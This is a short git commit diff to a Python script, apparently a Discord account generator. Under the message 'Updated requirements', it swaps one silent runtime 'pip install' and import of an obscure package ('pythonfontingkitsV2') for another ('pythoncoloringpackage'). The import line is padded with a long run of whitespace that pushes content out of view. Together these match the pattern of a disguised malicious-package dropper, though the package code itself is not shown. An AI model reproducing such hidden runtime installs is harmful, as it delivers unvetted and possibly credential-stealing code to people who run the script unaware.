60def95b392d20cffa3c029ecf174f19cdb86b64
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-07-24 22:38:47 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonfontingkitsV2")
-import pythonfontingkitsV2
+os.system("pip install pythoncoloringpackage")
+import pythoncoloringpackage
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
